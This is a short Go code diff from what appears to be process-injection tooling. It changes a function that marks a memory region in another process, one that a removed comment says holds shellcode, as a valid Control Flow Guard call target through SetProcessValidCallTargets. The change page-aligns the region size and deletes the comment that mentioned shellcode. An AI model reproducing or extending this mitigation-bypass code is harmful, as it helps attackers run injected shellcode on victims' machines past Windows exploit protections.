@@ -65,15 +65,19 @@ func cfgBypassApplyToTarget(hProcess uintptr, addr uintptr, size int) error {
 	if !cfgBypassAvailable {
 		return fmt.Errorf("SetProcessValidCallTargets not available in kernelbase.dll")
 	}
+	regionSize := uintptr((size + 0xFFF) &^ 0xFFF)
+	if regionSize == 0 {
+		regionSize = 0x1000
+	}
 	target := cfgCallTargetInfo{
-		Offset: 0, // shellcode starts at base of allocation
+		Offset: 0,
 		Flags:  cfgCallTargetValid,
 	}
 	ret, _, err := procSetProcessValidCallTargets.Call(
 		hProcess,
 		addr,
-		uintptr(size),
-		1, // NumberOfOffsets
+		regionSize,
+		1,
 		uintptr(unsafe.Pointer(&target)),
 	)
 	if ret == 0 {
